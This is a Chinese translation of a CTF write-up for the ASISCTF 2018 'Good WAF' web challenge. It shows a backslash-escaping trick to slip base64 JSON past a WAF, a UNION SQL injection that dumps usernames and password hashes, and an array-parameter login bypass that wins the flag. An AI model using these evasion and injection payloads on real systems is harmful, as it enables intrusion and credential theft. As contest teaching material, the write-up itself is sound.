<html>
<head>
<title>WAF Evasion — Base64 Parameter — ASISCTF 2018 Quals — Good WAF Question Write-Up (Web Task)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">WAF规避— Base64参数— ASISCTF 2018 Quals —良好的WAF问题记录(网络任务)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/waf-evasion-base64-parameter-asisctf-2018-quals-good-waf-question-write-up-web-task-c8454d33ba4d?source=collection_archive---------3-----------------------#2018-04-30">https://infosecwriteups.com/waf-evasion-base64-parameter-asisctf-2018-quals-good-waf-question-write-up-web-task-c8454d33ba4d?source=collection_archive---------3-----------------------#2018-04-30</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="d3dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">参与者被问了以下问题。</p><blockquote class="kl km kn"><p id="8c09" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">描述:</p><p id="1780" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">WAFs无法检测填充了不透明数据(如base64)的参数。因此，我们已经调整了我们的<a class="ae ks" href="http://167.99.12.110/" rel="noopener ugc nofollow" target="_blank">晶片</a>来更强地检查这些输入。</p><p id="2577" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">提示1 </strong> : base64(json_object)</p></blockquote><p id="0a60" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从这个问题中，可以理解为我们被赋予了一个受WAF保护的base64输入。打开网址<a class="ae ks" href="http://167.99.12.110/" rel="noopener ugc nofollow" target="_blank">http://167.99.12.110/</a>:</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="kz la di lb bf lc"><div class="gh gi kt"><img src="../Images/9c9a5d7e72b37b44aaaf76321b25633b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MaR9VibPjZLglbpIJrdH_A.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">网络问题/好的WAF</figcaption></figure><p id="84d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我从转换成base64开始</p><pre class="ku kv kw kx gt ln lm lo lp aw lq bi"><span id="bb65" class="lr ls iq lm b gy lt lu l lv lw"><strong class="lm ir">Notice</strong>: Undefined property: stdClass::$data in <strong class="lm ir">/var/www/html/index.php</strong> on line <strong class="lm ir">37</strong></span></pre><p id="21de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以合适的对象是<code class="fe lj lk ll lm b">{"data":"1"}</code>，我得到了结果。之后，我尝试在object中注入SQL查询，尝试了大多数可能的方法(大约1小时),得到了:</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="kz la di lb bf lc"><div class="gh gi lx"><img src="../Images/d3ae5c5d94da5aa4927e44facaed1280.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ysxdlbq56SajVksPBQTheA.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">检测到晶片</figcaption></figure><p id="31f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我发现了base64数据中的一个技巧后，我走错了路</p><pre class="ku kv kw kx gt ln lm lo lp aw lq bi"><span id="343c" class="lr ls iq lm b gy lt lu l lv lw">echo irGeeks | base64 | sed 's/./\\&amp;/g;s/&amp;//' | xargs -I x sh -c "echo x | base64 -d"</span></pre><p id="cfbd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我立即测试了恶意输入，达到了我想要的效果。</p><pre class="ku kv kw kx gt ln lm lo lp aw lq bi"><span id="c019" class="lr ls iq lm b gy lt lu l lv lw"><a class="ae ks" href="http://167.99.12.110/?object=\e\y\J\k\Y\X\R\h\I\j\o\i\M\S\c\i\f\Q\=\=" rel="noopener ugc nofollow" target="_blank">?object=\e\y\J\k\Y\X\R\h\I\j\o\i\M\S\c\i\f\Q\=\=</a></span></pre><p id="8883" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在一些基本的查询之后，它变成了一个简单的SQLi:</p><pre class="ku kv kw kx gt ln lm lo lp aw lq bi"><span id="d2d2" class="lr ls iq lm b gy lt lu l lv lw">{"data":"-1' union all select 1,group_concat(id,0x7c,username,0x7c,password,0x7c,role) from credentials-- -"}</span></pre><p id="e92c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">导致了:</p><pre class="ku kv kw kx gt ln lm lo lp aw lq bi"><span id="646a" class="lr ls iq lm b gy lt lu l lv lw">1|valid_user|5f4dcc3b5aa765d61d8327deb882cf99|administrator</span></pre><p id="9d64" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">等等，登录页面在哪里？有一个名为<code class="fe lj lk ll lm b">access_logs</code>的表包含一些apache访问日志行，在<code class="fe lj lk ll lm b">id=14</code>中，一个URL被泄露</p><pre class="ku kv kw kx gt ln lm lo lp aw lq bi"><span id="51f9" class="lr ls iq lm b gy lt lu l lv lw">14|167.99.12.110 - - [22/Apr/2018:15:40:23 +0430] "GET /?action=log-in HTTP/1.1" 200 681 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"</span></pre><p id="6180" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">访问网址<code class="fe lj lk ll lm b">/?action=log-in</code>:</p><pre class="ku kv kw kx gt ln lm lo lp aw lq bi"><span id="cb4d" class="lr ls iq lm b gy lt lu l lv lw"><strong class="lm ir">Notice</strong>: Undefined index: credentials in <strong class="lm ir">/var/www/html/index.php</strong> on line <strong class="lm ir">21</strong><br/><br/><strong class="lm ir">Notice</strong>: Undefined index: credentials in <strong class="lm ir">/var/www/html/index.php</strong> on line <strong class="lm ir">22</strong><br/>Invalid Credentials.</span></pre><blockquote class="kl km kn"><p id="0500" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><a class="ae ks" href="http://167.99.12.110/?action=log-in&amp;credentials[]=valid_user&amp;credentials[]=password" rel="noopener ugc nofollow" target="_blank">凭证</a> <a class="ae ks" href="http://167.99.12.110/?action=log-in&amp;credentials=" rel="noopener ugc nofollow" target="_blank"> = </a></p></blockquote><pre class="ku kv kw kx gt ln lm lo lp aw lq bi"><span id="283c" class="lr ls iq lm b gy lt lu l lv lw"><strong class="lm ir">Notice</strong>: Uninitialized string offset: 0 in <strong class="lm ir">/var/www/html/index.php</strong> on line <strong class="lm ir">21</strong><br/><br/><strong class="lm ir">Notice</strong>: Uninitialized string offset: 1 in <strong class="lm ir">/var/www/html/index.php</strong> on line <strong class="lm ir">22</strong><br/>Invalid Credentials.</span></pre><blockquote class="kl km kn"><p id="56c4" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><a class="ae ks" href="http://167.99.12.110/?action=log-in&amp;credentials[]=valid_user&amp;credentials[]=password" rel="noopener ugc nofollow" target="_blank">凭证[]=有效_用户&amp;凭证[]=密码</a></p></blockquote><pre class="ku kv kw kx gt ln lm lo lp aw lq bi"><span id="c05f" class="lr ls iq lm b gy lt lu l lv lw"><strong class="lm ir">ASIS{e279aaf1780c798e55477a7afc7b2b18}</strong></span></pre></div></div>    
</body>
</html>